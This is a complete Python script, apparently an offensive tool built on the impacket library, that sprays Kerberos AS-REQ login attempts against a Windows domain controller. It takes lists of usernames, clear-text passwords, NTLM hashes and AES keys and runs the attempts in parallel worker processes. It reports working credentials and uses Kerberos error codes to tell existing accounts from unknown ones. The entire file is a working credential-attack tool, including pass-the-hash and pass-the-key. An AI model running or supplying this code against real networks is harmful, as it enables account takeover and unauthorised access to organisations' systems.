#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import argparse
import sys
import os
from binascii import unhexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
import multiprocessing
import socket


def login(username, password, domain, lmhash, nthash, aesKey, dc_ip):
    try:
        kerb_principal = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        getKerberosTGT(
            kerb_principal,
            password,
            domain,
            unhexlify(lmhash) if lmhash else b'',
            unhexlify(nthash) if nthash else b'',
            aesKey,
            dc_ip
        )

        if lmhash or nthash:
            cred_desc = f"hash {lmhash}:{nthash}"
        elif aesKey:
            cred_desc = f"aesKey {aesKey}"
        else:
            cred_desc = f"password '{password}'"

        print(f"[+] Success {domain}/{username} :: {cred_desc}")

    except KerberosError as e:
        if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or \
           (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or \
           (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value):
            print(f"[-] Could not find username: {domain}/{username}")
        elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
            # Wrong creds, user exists – just move on
            return
        else:
            print(e)

    except socket.error:
        print("[-] Could not connect to DC")
        return


def main():
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Kerberos AS-REQ Spraying Toolkit (multi-user, multi-credential)"
    )

    # === authentication options ===
    auth_group = parser.add_argument_group('authentication')
    auth_group.add_argument(
        '-username',
        action='store',
        metavar='username',
        help='Single username to spray (use [domain/]username or just username)'
    )
    auth_group.add_argument(
        '-userfile',
        action='store',
        metavar='userfile',
        help='File with usernames, one per line, optionally in [domain/]username format'
    )
    auth_group.add_argument(
        '-password',
        action='store',
        metavar='password',
        help='Single clear-text password'
    )
    auth_group.add_argument(
        '-passfile',
        action='store',
        metavar='passfile',
        help='File with clear-text passwords, one per line'
    )
    auth_group.add_argument(
        '-hashes',
        action='store',
        metavar='LMHASH:NTHASH',
        help='Single NTLM hash, format LMHASH:NTHASH'
    )
    auth_group.add_argument(
        '-hashfile',
        action='store',
        metavar='hashfile',
        help='File with hashes, one per line in LMHASH:NTHASH or NTHASH format'
    )
    auth_group.add_argument(
        '-aesKey',
        action='store',
        metavar='hex key',
        help='Single AES key (hex) for Kerberos Authentication (128 or 256 bits)'
    )
    auth_group.add_argument(
        '-keysfile',
        action='store',
        metavar='keysfile',
        help='File with AES keys (hex), one per line'
    )

    # === connection / tuning options ===
    conn_group = parser.add_argument_group('connection')
    conn_group.add_argument(
        '-domain',
        action='store',
        metavar='domain',
        help='FQDN of the target domain'
    )
    conn_group.add_argument(
        '-dc-ip',
        action='store',
        metavar='address',
        help='Domain controller address (hostname, IPv4, or IPv6)'
    )
    conn_group.add_argument(
        '-workers',
        action='store',
        metavar='N',
        type=int,
        default=10,
        help='Number of concurrent worker processes (default: 10)'
    )

    # No args -> print help / options
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # sanity checks: users
    if options.username is None and options.userfile is None:
        print("[-] You must provide -username or -userfile")
        parser.print_help()
        sys.exit(1)

    if options.dc_ip is None or options.domain is None:
        print("[-] You must provide -domain and -dc-ip")
        parser.print_help()
        sys.exit(1)

    if options.workers <= 0:
        print("[-] -workers must be a positive integer")
        sys.exit(1)

    # quick check that dc_ip resolves as IPv4/IPv6/hostname
    try:
        # Try as numeric (IPv4/IPv6) first
        socket.getaddrinfo(options.dc_ip, 88, 0, 0, 0, socket.AI_NUMERICHOST)
    except socket.gaierror:
        # If it's not a numeric address, try allowing hostnames
        try:
            socket.getaddrinfo(options.dc_ip, 88)
        except socket.gaierror:
            print(f"[-] Invalid DC address (hostname / IPv4 / IPv6): {options.dc_ip}")
            sys.exit(1)

    # === Build user list: list of (domain, username) ===
    user_targets = []

    # Single username
    if options.username is not None:
        domain = options.domain
        user = options.username

        if "/" in user:
            domain_from_user, just_user = user.split("/", 1)
            if domain_from_user:
                domain = domain_from_user
            user = just_user

        user_targets.append((domain.strip(), user.strip()))

    # User file
    if options.userfile is not None:
        if not os.path.isfile(options.userfile):
            print(f"[-] User file not found: {options.userfile}")
            sys.exit(1)
        try:
            with open(options.userfile, 'r') as uf:
                for line in uf:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    u_domain = options.domain
                    u = line

                    if "/" in u:
                        domain_from_file, just_user = u.split("/", 1)
                        if domain_from_file:
                            u_domain = domain_from_file
                        u = just_user

                    user_targets.append((u_domain.strip(), u.strip()))
        except OSError as e:
            print(f"[-] Error reading user file '{options.userfile}': {e}")
            sys.exit(1)

    if not user_targets:
        print("[-] No valid users loaded")
        sys.exit(1)

    # === Build credential sets ===
    plaintext_passwords = []  # list of passwords (str)
    hash_creds = []           # list of (lmhash, nthash)
    aes_keys = []             # list of AES keys (hex str)

    # Single password
    if options.password is not None:
        plaintext_passwords.append(options.password)

    # Passfile
    if options.passfile is not None:
        if not os.path.isfile(options.passfile):
            print(f"[-] Password file not found: {options.passfile}")
            sys.exit(1)
        try:
            with open(options.passfile, 'r') as pf:
                for line in pf:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    plaintext_passwords.append(line)
        except OSError as e:
            print(f"[-] Error reading password file '{options.passfile}': {e}")
            sys.exit(1)

    # Single hashes
    if options.hashes is not None:
        try:
            lmhash, nthash = options.hashes.split(':', 1)
        except ValueError:
            print("[-] Invalid -hashes format, expected LMHASH:NTHASH")
            sys.exit(1)
        hash_creds.append((lmhash.strip(), nthash.strip()))

    # Hashfile
    if options.hashfile is not None:
        if not os.path.isfile(options.hashfile):
            print(f"[-] Hash file not found: {options.hashfile}")
            sys.exit(1)
        try:
            with open(options.hashfile, 'r') as hf:
                for line in hf:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    if ':' in line:
                        lmhash, nthash = line.split(':', 1)
                    else:
                        lmhash = ''
                        nthash = line

                    hash_creds.append((lmhash.strip(), nthash.strip()))
        except OSError as e:
            print(f"[-] Error reading hash file '{options.hashfile}': {e}")
            sys.exit(1)

    # Single AES key
    if options.aesKey is not None:
        aes_keys.append(options.aesKey.strip())

    # Keysfile
    if options.keysfile is not None:
        if not os.path.isfile(options.keysfile):
            print(f"[-] Keys file not found: {options.keysfile}")
            sys.exit(1)
        try:
            with open(options.keysfile, 'r') as kf:
                for line in kf:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    aes_keys.append(line)
        except OSError as e:
            print(f"[-] Error reading keys file '{options.keysfile}': {e}")
            sys.exit(1)

    # At least one auth method
    if not plaintext_passwords and not hash_creds and not aes_keys:
        print("[-] You must provide at least one of: "
              "-password/-passfile/-hashes/-hashfile/-aesKey/-keysfile")
        parser.print_help()
        sys.exit(1)

    if aes_keys:
        # Compatibility with original script if something checks this
        options.k = True

    # === Build all tasks for Pool ===
    tasks = []

    for user_domain, user_name in user_targets:
        # (user_domain, user_name) × passwords
        for pwd in plaintext_passwords:
            tasks.append((
                user_name,
                pwd,
                user_domain,
                '',
                '',
                None,
                options.dc_ip
            ))

        # hash creds
        for lmhash, nthash in hash_creds:
            tasks.append((
                user_name,
                '',
                user_domain,
                lmhash,
                nthash,
                None,
                options.dc_ip
            ))

        # aes keys
        for aes_key in aes_keys:
            tasks.append((
                user_name,
                '',
                user_domain,
                '',
                '',
                aes_key,
                options.dc_ip
            ))

    if not tasks:
        print("[-] No login attempts were generated (check your inputs).")
        sys.exit(1)

    print(f"[+] Loaded {len(user_targets)} users")
    print(f"[+] Loaded {len(plaintext_passwords)} passwords, "
          f"{len(hash_creds)} hashes, {len(aes_keys)} AES keys")
    print(f"[+] Total login attempts to perform: {len(tasks)}")
    print(f"[+] Using {options.workers} worker processes\n")

    # Use a process pool to avoid 'Too many open files'
    try:
        with multiprocessing.Pool(processes=options.workers) as pool:
            pool.starmap(login, tasks)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user, terminating workers...")
        pool.terminate()
        pool.join()


if __name__ == "__main__":
    main()
